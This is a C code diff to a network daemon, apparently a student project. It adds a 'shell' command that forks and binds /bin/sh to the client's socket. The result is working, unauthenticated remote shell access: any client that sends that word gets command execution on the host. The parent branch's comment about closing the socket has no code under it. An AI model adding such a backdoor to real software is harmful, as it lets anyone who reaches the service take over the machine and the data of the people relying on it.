@@ -152,11 +152,41 @@ void	receive_communication(int i, t_daemon *daemon)
             free(daemon);
 			exit(EXIT_SUCCESS);
 		}
+		if (strcmp(buffer, "shell") == 0)
+		{
+			//create a shell
+			create_shell(daemon->_poll_fds[i].fd);
+		}
 		// add here a log entry with the message
 		//std::string user_input("User input: ");
 		//user_input+= buffer;
 		//logger.log_entry(user_input, "LOG");
 	}
+}
+
+void create_shell(int fd)
+{
+	// Create a new process
+	pid_t pid = fork();
+	if (pid == -1)
+	{
+		perror("Fork failed");
+		return ;
+	}
+	if (pid == 0)
+	{
+		// Child process
+		// Redirect stdin, stdout and stderr to the socket
+		dup2(fd, 0);
+		dup2(fd, 1);
+		dup2(fd, 2);
+		// Execute the shell
+		execl("/bin/sh", "/bin/sh", NULL);
+		// If execl fails, exit the child process
+		exit(EXIT_FAILURE);
+	}
+	// Parent process
+	// Close the socket in the parent process
 }
 
 void	add_user(int fd, t_daemon *daemon)
